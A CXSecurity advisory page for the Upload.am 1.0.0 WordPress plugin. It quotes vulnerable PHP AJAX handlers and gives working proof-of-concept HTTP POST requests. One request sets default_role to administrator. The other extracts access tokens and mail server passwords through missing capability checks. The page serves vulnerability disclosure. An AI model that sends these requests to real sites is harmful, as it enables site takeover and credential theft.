---
title: Upload.am 1.0.0 WordPress Plugin - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025080015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-17
fetch_date: 2025-10-07T00:12:42.203330
---

# Upload.am 1.0.0 WordPress Plugin - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Upload.am 1.0.0 WordPress Plugin - Multiple Vulnerabilities** **2025.08.16**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Upload.am 1.0.0 WordPress Plugin - Multiple Vulnerabilities
# Date: Aug 12, 2025
# Exploit Author: bRpsd cy[at]live.no
# Vendor Homepage: https://wordpress.org/plugins/upload-am-file-hosting-vpn/
# Version: <= 1.0.0
# Tested on: MacOS, localhost xampp
# Authentication required: Low privilege
Critical: Unauthorized Settings Modification (CWE-862)
CVE-ID: N/A
CVSS: 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)
Affected File: upload-am-file-hosting-vpn.php:283-291
Vulnerable Code:
283: add\_action('wp\_ajax\_upload\_am\_update\_option', function () {
284: check\_ajax\_referer('upload\_am\_nonce', 'nonce');
285: if (!isset($\_POST['option\_name']) || !isset($\_POST['option\_value'])) {
286: wp\_send\_json\_error(['message' => 'Missing required parameters']);
287: }
288: $option\_name = sanitize\_text\_field(wp\_unslash($\_POST['option\_name']));
289: $option\_value = sanitize\_text\_field(wp\_unslash($\_POST['option\_value']));
290: update\_option($option\_name, $option\_value);
291: wp\_send\_json\_success(['message' => 'Option updated']);
Input Source:
Parameter: $\_POST['option\_name'] and $\_POST['option\_value']
Flow: User input -> sanitize\_text\_field() -> update\_option() with no capability check
Impact:
Complete WordPress configuration control allowing:
Privilege escalation (setting default\_role to administrator)
Site takeover (modifying admin\_email, siteurl)
Security bypass (disabling security plugins via active\_plugins option)
Malicious redirections and content injection
POC:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress\_logged\_in\_xxx=value
action=upload\_am\_update\_option&option\_name=default\_role&option\_value=administrator&nonce=VALID\_NONCE\_HERE
============================================================================================================
High: Sensitive Information Disclosure (CWE-200)
CVSS: 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
Affected File: upload-am-file-hosting-vpn.php:275-281
Vulnerable Code:
275: add\_action('wp\_ajax\_upload\_am\_get\_option', function () {
276: check\_ajax\_referer('upload\_am\_nonce', 'nonce');
277: if (!isset($\_POST['option\_name'])) {
278: wp\_send\_json\_error(['message' => 'Missing option\_name']);
279: }
280: $option\_name = sanitize\_text\_field(wp\_unslash($\_POST['option\_name']));
281: $value = get\_option($option\_name);
282: wp\_send\_json\_success($value);
Parameter: $\_POST['option\_name']
Flow: User input -> sanitize\_text\_field() -> get\_option() -> JSON response
POC:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress\_logged\_in\_xxx=value
action=upload\_am\_get\_option&option\_name=upload\_am\_access\_token&nonce=VALID\_NONCE\_HERE
Additional sensitive options that can be extracted:
option\_name=mailserver\_login
option\_name=mailserver\_pass
# Site configuration
option\_name=admin\_email
option\_name=users\_can\_register
option\_name=active\_plugins
option\_name=siteurl
option\_name=home
# Authentication tokens
option\_name=upload\_am\_access\_token
option\_name=upload\_am\_refresh\_token
Impact:
Exposure of sensitive WordPress configuration including:
API tokens and credentials
Plugin/theme configuration
Administrative email addresses
Site URLs and security settings

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top